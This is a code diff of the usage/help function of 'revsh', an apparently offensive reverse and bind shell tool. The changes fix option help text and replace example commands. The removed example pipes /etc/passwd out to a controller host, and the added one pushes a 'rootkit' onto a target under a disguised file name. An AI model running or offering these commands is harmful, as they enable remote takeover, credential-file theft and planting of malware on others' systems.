@@ -79,19 +79,20 @@ void usage(){
 	fprintf(stderr, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
 	fprintf(stderr, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
 	fprintf(stderr, "\t-k\t\tStart the bind shell in keep-alive mode.\t(Ignored in reverse shell mode.)\n");
-	fprintf(stderr, "\t-n\t\tNetcat style data broker. No tty.\t\t(Default is interactive w/remote tty.)\n\t\t\tNon-interactive. Useful for copying files.\n");
-	fprintf(stderr, "\t-h\t\tVerbose output. (Output may mix with data if used with '-n'.)\n");
+	fprintf(stderr, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
+	fprintf(stderr, "\t-v\t\tVerbose output.\n");
 	fprintf(stderr, "\t-h\t\tPrint this help.\n");
 	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
 	fprintf(stderr, "\n\tNotes:\n");
 	fprintf(stderr, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
 	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
+	fprintf(stderr, "\t\t* Verbose output may mix with data if -v is used together with -n.\n");
 	fprintf(stderr, "\n\tInteractive example:\n");
 	fprintf(stderr, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
 	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
 	fprintf(stderr, "\n\tNon-interactive example:\n");
-	fprintf(stderr, "\t\tlocal controller host:\trevsh -n -c 192.168.0.42:443 >data_exfil/passwd\n");
-	fprintf(stderr, "\t\tremote target host:\tcat /etc/passwd | revsh 192.168.0.42:443\n");
+	fprintf(stderr, "\t\tlocal controller host:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
+	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
 	fprintf(stderr, "\n\n");
 
 	exit(-1);
